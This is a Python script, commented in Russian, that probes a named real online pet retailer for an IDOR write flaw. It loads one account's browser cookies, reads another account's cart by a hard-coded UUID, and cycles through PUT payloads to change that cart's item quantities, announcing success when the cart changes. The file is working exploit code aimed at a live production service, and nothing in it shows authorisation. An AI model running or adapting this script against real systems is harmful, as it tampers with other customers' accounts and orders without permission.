#!/usr/bin/env python3
"""
Автоматический тест IDOR Write через PUT метод
Использует cookies из браузера (нужно скопировать вручную)
"""

import requests
import json

CART_UUID = "6bd223b4-5040-4faa-ba85-6a85c1ec2d50"
BASE_URL = "https://www.zooplus.de"

# ВАЖНО: Замените эти cookies на актуальные из браузера (Account B)
# Скопируйте cookies из DevTools → Application → Cookies → www.zooplus.de
COOKIES = {
    # Пример (замените на реальные):
    # 'sid': 'ваш-sid-здесь',
    # 'cid': 'ваш-cid-здесь',
    # и другие cookies
}

def test_idor_write():
    print("[*] ========================================")
    print("[*] IDOR WRITE TEST (Python)")
    print("[*] ========================================")
    
    session = requests.Session()
    session.cookies.update(COOKIES)
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Origin': BASE_URL,
        'Referer': f'{BASE_URL}/checkout/cart'
    })
    
    # Шаг 1: Получить корзину Account A
    print("\n[*] Getting cart before modification...")
    try:
        r = session.get(f'{BASE_URL}/checkout/api/cart-api/v2/cart/{CART_UUID}')
        r.raise_for_status()
        cart_before = r.json()
        
        before_count = len(cart_before.get('articles', []))
        before_total = cart_before.get('summary', {}).get('grandTotal', 0)
        article_id = cart_before.get('articles', [{}])[0].get('id')
        cart_id = cart_before.get('cartId')
        sid = cart_before.get('sid')
        
        print(f"[+] Cart before: {before_count} items, {before_total} EUR")
        print(f"[+] Article ID: {article_id}, Cart ID: {cart_id}, SID: {sid}")
        
        if not article_id:
            print("[!] No articles in cart!")
            return False
            
    except Exception as e:
        print(f"[!] Error getting cart: {e}")
        return False
    
    # Шаг 2: Попробовать разные варианты payload
    payloads = [
        {"name": "articleId + quantity", "payload": {"articleId": article_id, "quantity": 2}},
        {"name": "id + quantity", "payload": {"id": article_id, "quantity": 2}},
        {"name": "With cartUuid", "payload": {"articleId": article_id, "quantity": 2, "cartUuid": CART_UUID}},
        {"name": "With sid", "payload": {"articleId": article_id, "quantity": 2, "sid": sid}},
        {"name": "With cartId", "payload": {"articleId": article_id, "quantity": 2, "cartId": cart_id}},
        {"name": "Full format", "payload": {"articleId": article_id, "quantity": 2, "cartUuid": CART_UUID, "sid": sid, "cartId": cart_id}},
    ]
    
    success_payload = None
    
    for test in payloads:
        print(f"\n[*] Testing: {test['name']}")
        print(f"    Payload: {json.dumps(test['payload'])}")
        
        try:
            r = session.put(
                f'{BASE_URL}/semiprotected/api/checkout/state-api/v2/set-article-quantity',
                json=test['payload']
            )
            
            content_type = r.headers.get('content-type', '')
            print(f"    Status: {r.status_code}, Content-Type: {content_type}")
            
            if r.status_code == 200 and 'application/json' in content_type:
                try:
                    json_resp = r.json()
                    print(f"    [!!!] SUCCESS! JSON response received")
                    print(f"    Response: {json.dumps(json_resp)[:200]}")
                    success_payload = test['payload']
                    break
                except:
                    print(f"    Response (not JSON): {r.text[:100]}")
            else:
                print(f"    Response: {r.text[:100]}")
                
        except Exception as e:
            print(f"    Error: {e}")
    
    # Шаг 3: Проверить корзину после модификации
    print("\n[*] Checking cart after modification...")
    try:
        r = session.get(f'{BASE_URL}/checkout/api/cart-api/v2/cart/{CART_UUID}')
        r.raise_for_status()
        cart_after = r.json()
        
        after_count = len(cart_after.get('articles', []))
        after_total = cart_after.get('summary', {}).get('grandTotal', 0)
        
        print(f"[+] Cart after: {after_count} items, {after_total} EUR")
        
        if after_count != before_count or abs(after_total - before_total) > 0.01:
            print("\n[!!!] ========================================")
            print("[!!!] CRITICAL IDOR WRITE CONFIRMED!")
            print("[!!!] ========================================")
            print(f"[!!!] Before: {before_count} items, {before_total} EUR")
            print(f"[!!!] After:  {after_count} items, {after_total} EUR")
            print("[!!!] Account B successfully modified Account A's cart!")
            if success_payload:
                print(f"[!!!] Working payload: {json.dumps(success_payload)}")
            return True
        else:
            print("\n[!] Cart unchanged - write operations may be protected")
            return False
            
    except Exception as e:
        print(f"[!] Error checking cart: {e}")
        return False

if __name__ == "__main__":
    if not COOKIES or 'sid' not in COOKIES:
        print("[!] ERROR: Cookies not configured!")
        print("[!] Please copy cookies from browser DevTools and update COOKIES dict in this script")
        print("[!] DevTools → Application → Cookies → www.zooplus.de")
    else:
        test_idor_write()

